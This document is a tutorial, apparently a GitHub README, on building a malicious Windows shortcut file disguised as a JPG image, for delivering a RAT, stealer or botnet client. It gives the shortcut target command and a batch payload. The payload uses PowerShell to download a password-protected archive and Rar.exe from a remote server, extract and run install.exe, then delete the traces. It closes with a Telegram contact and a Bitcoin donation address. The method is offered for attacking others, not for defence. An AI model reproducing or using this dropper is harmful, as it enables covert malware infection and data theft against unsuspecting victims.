<h1 align="center">lnk artifact</h1>

<p align="center">
	<i>Toxic shortcuts in Windows: an old artifact, not forgotten by hackers, but partially forgotten by forensics..</i>
</p>

-------
I welcome all friends, this is by no means an advertisement of a third-party resource, but you can find more detailed information on [Habr](https://habr.com/ru/company/group-ib/blog/493906/).

In this topic, I will show only how to use it for my own purposes.
All we need is the winrar archiver, or rather Rar.exe and our malicious RMS or RAT or BOTNET or STEALER file, etc. etc. Next, we pack our malicious file called install.exe into an archive with a password, password: 123321, the name of the archive at the output is install.rar, upload the Rar.exe and install.rar files to our server and give both files permission 777 to read, write and execution.

We have already dealt with the introductory part, let's proceed to the assembly.

We will mask it under the picture, therefore we create a shortcut on the desktop and indicate the code in the location:

---
~~~bat
%COMSPEC% /c "copy /Y image.lnk %temp%\1&findstr /c:"@ECHO" %temp%\1>%temp%\s.bat&start /MIN %TEMP%\s.bat&exit"
~~~
---
<p align="center">
	<img src="https://i.postimg.cc/W1HMyrnr/1.png" />
</p>

Next, we set the name of what is in the location: image

<p align="center">
	<img src="https://i.postimg.cc/2Sh0n0my/2.png" />
</p>

Next, go to the properties of the lnk file and remove the working folder

<p align="center">
	<img src="https://i.postimg.cc/Kv62ZpJ8/3.png" />
</p>

And optionally we put any icon, but since we want to disguise it as a picture, we select the jpg icon.

<p align="center">
	<img src="https://i.postimg.cc/4dY1WPtr/4.png" />
</p>

Open image.lnk in any text editor Notepad++ in my case, version 7.8.6 (Open np++ and transfer our lnk file to the main window) and add our code to download and launch the backdoor from the server to the next line:

---
~~~bat
@ECHO OFF && IF EXIST "%temp%\lnkexp.txt" (exit) ELSE echo lnkexp»%temp%\lnkexp.txt && powershell -Command (new-object System.Net.WebClient).DownloadFile('http://site.ru/install.rar', '%temp%/install.rar') && powershell -Command (new-object System.Net.WebClient).DownloadFile('http://site.ru/Rar.exe', '%temp%/Rar.exe') && %temp%\Rar.exe x -t -o+ -p123321 %temp%\install.rar %temp%\ && %temp%\install.exe && del /f /q %temp%\install.rar && del /f /q %temp%\Rar.exe && exit
~~~
---
<p align="center">
	<img src="https://i.postimg.cc/26znJfJb/5.png" />
</p>


That's all, our lnk is ready, and everything that I think further is intuitive.
Link to youtube: [www.youtube.com](https://youtu.be/LOv5SX6uaHM)

### Support
Telegram: @Official_Mr_Robot

BTC: 1PoieWSbe1A7o2nAuXE37ncQHnGqxcdhJc
